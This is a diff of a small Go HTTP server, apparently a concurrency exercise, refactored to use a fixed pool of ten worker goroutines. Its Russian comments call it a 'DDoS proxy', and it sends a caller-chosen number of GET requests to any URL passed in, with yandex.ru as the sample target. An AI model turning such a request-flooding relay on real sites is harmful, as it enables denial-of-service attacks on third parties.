@@ -1,17 +1,16 @@
 package main
 
 import (
-	"flag"
 	"log"
 	"net/http"
 	"strconv"
 )
 
-type Job struct {
-	URL string
-}
+// GET http://localhost:8080/?url=https://yandex.ru&num=10
 
-func makeGetRequest(url string) {
+const workersMaxCount int = 10
+
+func makeRequest(url string) {
 	log.Println("making request to", url)
 
 	_, err := http.Get(url)
@@ -24,15 +23,13 @@ func makeGetRequest(url string) {
 }
 
 func main() {
-	// можно устанавливать число N через флаг
-	workersCount := flag.Int("c", 1, "number of concurrent workers")
-	flag.Parse()
-
-	jobCh := make(chan *Job)
-	for i := 0; i < *workersCount; i++ {
+	urlsChan := make(chan string)
+	// Одновременно сможем ддосить workersMaxCount раз. Потому что у нас
+	// будет всего workersMaxCount горутин
+	for i := 0; i < workersMaxCount; i++ {
 		go func() {
-			for job := range jobCh {
-				makeGetRequest(job.URL)
+			for url := range urlsChan {
+				makeRequest(url)
 			}
 		}()
 	}
@@ -40,7 +37,6 @@ func main() {
 	// это DDoS-прокси
 	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
 		url := r.FormValue("url")
-
 		reqsCountRaw := r.FormValue("num")
 		reqsCount, err := strconv.Atoi(reqsCountRaw)
 		if err != nil {
@@ -49,8 +45,7 @@ func main() {
 		}
 
 		for i := 0; i < reqsCount; i++ {
-			job := &Job{URL: url}
-			jobCh <- job
+			urlsChan <- url
 		}
 
 		w.WriteHeader(http.StatusOK)
